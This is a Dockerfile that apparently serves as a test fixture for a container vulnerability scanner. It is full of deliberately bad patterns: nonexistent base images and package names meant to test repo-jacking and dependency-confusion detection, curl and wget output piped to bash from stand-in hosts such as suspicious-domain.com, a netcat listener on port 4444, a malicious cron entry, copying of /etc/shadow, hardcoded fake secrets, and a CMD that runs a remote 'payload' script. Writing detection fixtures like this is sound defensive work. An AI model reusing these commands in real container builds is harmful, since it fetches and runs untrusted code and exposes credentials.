# Comprehensive Dockerfile for vulnerability testing
# This file contains various patterns to test Docker vulnerability detection

# Test 1: Non-existent base image for repo jacking detection
FROM nonexistent-org/missing-base-image:latest AS stage1

# Test 2: Another non-existent image
FROM hijackable-registry/vulnerable-base:v1.0.0 AS stage2

# Test 3: Missing organization image
FROM deleted-org/removed-image:alpine AS stage3

# Test 4: Suspicious private registry image that might not exist
FROM private-missing.registry.com/fake-image:latest AS stage4

# Test 5: Non-existent Docker Hub image
FROM fakesecurityorg/missing-tool:v2.1.0 AS main-stage

# Install packages across multiple package managers for dependency confusion testing
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    git \
    python3 \
    python3-pip \
    nodejs \
    npm \
    ruby \
    ruby-dev \
    openjdk-11-jdk \
    maven \
    golang-go \
    php \
    composer \
    cargo \
    rustc \
    perl \
    cpanminus \
    r-base \
    && rm -rf /var/lib/apt/lists/
  
# Test NPM dependency confusion vulnerabilities
RUN npm install -g \
    nonexistent-npm-security-tool \
    missing-npm-package-12345 \
    fake-security-scanner-npm \
    hijackable-npm-module-test \
    vulnerable-npm-package-test \
    deleted-npm-security-lib

# Test Python/PyPI dependency confusion vulnerabilities  
RUN pip3 install \
    nonexistent-pypi-security-tool \
    missing-python-package-12345 \
    fake-security-scanner-pypi \
    hijackable-pypi-module-test \
    vulnerable-pypi-package-test \
    deleted-python-security-lib

# Test Ruby/RubyGems dependency confusion vulnerabilities
RUN gem install \
    nonexistent-gem-security-tool \
    missing-ruby-package-12345 \
    fake-security-scanner-gem \
    hijackable-gem-module-test \
    vulnerable-gem-package-test

# Test Go dependency confusion vulnerabilities
RUN go install github.com/nonexistent-org/fake-go-security-tool@latest && \
    go install github.com/missing-owner/hijackable-go-scanner@v1.0.0 && \
    go install github.com/deleted-org/vulnerable-go-package@main

# Test Cargo/Rust dependency confusion vulnerabilities
RUN cargo install nonexistent-crate-security-tool && \
    cargo install missing-rust-package-12345 && \
    cargo install fake-security-scanner-crate && \
    cargo install hijackable-cargo-module-test

# Test Composer/PHP dependency confusion vulnerabilities
COPY composer.json /tmp/composer.json
RUN cd /tmp && composer install

# Test Maven/Java dependency confusion - create vulnerable pom.xml
RUN mkdir -p /tmp/maven-test
COPY pom.xml /tmp/maven-test/
RUN cd /tmp/maven-test && mvn dependency:resolve

# Test CPAN/Perl dependency confusion vulnerabilities
RUN cpanm NonExistent::Security::Tool && \
    cpanm Missing::Perl::Package && \
    cpanm Fake::Security::Scanner::CPAN && \
    cpanm Hijackable::Perl::Module::Test

# Test R/CRAN dependency confusion vulnerabilities
RUN Rscript -e "install.packages(c('nonexistent-r-security-tool', 'missing-r-package-12345', 'fake-security-scanner-r'))"

# Test additional suspicious Docker patterns
RUN curl -sSL https://raw.githubusercontent.com/nonexistent-org/malicious-docker-script/main/install.sh | bash

# Test downloading from non-existent GitHub repositories
RUN wget https://github.com/missing-security-org/fake-docker-tools/releases/download/v1.0.0/tool.tar.gz -O /tmp/tool.tar.gz

# Test git clone from non-existent repositories
RUN git clone https://github.com/deleted-docker-org/missing-repo.git /tmp/missing-repo

# Test suspicious network activities
EXPOSE 22 23 4444 8080 9999
RUN echo "Backdoor setup" > /tmp/backdoor.txt

# Test environment variable exposure risks
ENV SECRET_KEY="test-secret-key-123"
ENV API_TOKEN="fake-api-token-456"
ENV DATABASE_PASSWORD="vulnerable-password"

# Test running as root (security risk)
USER root

# Test copying sensitive files
COPY --from=stage1 /etc/passwd /tmp/passwd-copy
COPY --from=stage2 /etc/shadow /tmp/shadow-copy

# Test suspicious RUN commands
RUN chmod 777 /tmp
RUN echo "* * * * * /tmp/malicious-script.sh" | crontab -
RUN nc -l 4444 &

# Test downloading and executing from suspicious sources
RUN curl -fsSL https://suspicious-domain.com/docker-install.sh | sh
RUN wget -qO- https://malicious-registry.com/setup | bash

# Test additional GitHub repository references for repo jacking detection
RUN echo "Cloning additional repos for testing..." && \
    git clone https://github.com/hijackable-docker/vulnerable-configs.git /tmp/configs && \
    git clone https://github.com/missing-devops/docker-security-tools.git /tmp/security && \
    git clone https://github.com/nonexistent-containers/missing-images.git /tmp/images

# Test Docker-in-Docker suspicious pattern
RUN curl -fsSL https://get.docker.com | sh

# Test additional suspicious package installations
RUN pip3 install --user \
    deleted-security-python-docker \
    hijackable-docker-scanner-pypi \
    nonexistent-container-security-tool

RUN npm install -g \
    missing-docker-security-npm \
    fake-container-scanner-node \
    vulnerable-docker-tool-npm

# Test copying from non-existent external sources
ADD https://github.com/missing-docker-org/fake-config/raw/main/config.json /tmp/config.json
ADD https://github.com/deleted-containers/missing-files/archive/main.tar.gz /tmp/files.tar.gz

# Test HEALTHCHECK with suspicious activity
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD curl -f http://suspicious-domain.com/health || exit 1

# Test ONBUILD with potential vulnerabilities
ONBUILD RUN curl -sSL https://raw.githubusercontent.com/nonexistent-org/onbuild-script/main/setup.sh | bash
ONBUILD COPY https://github.com/missing-source/docker-configs/archive/main.tar.gz /tmp/

# Final suspicious command
CMD ["sh", "-c", "curl -s https://raw.githubusercontent.com/deleted-malicious/docker-payload/main/run.sh | bash"]
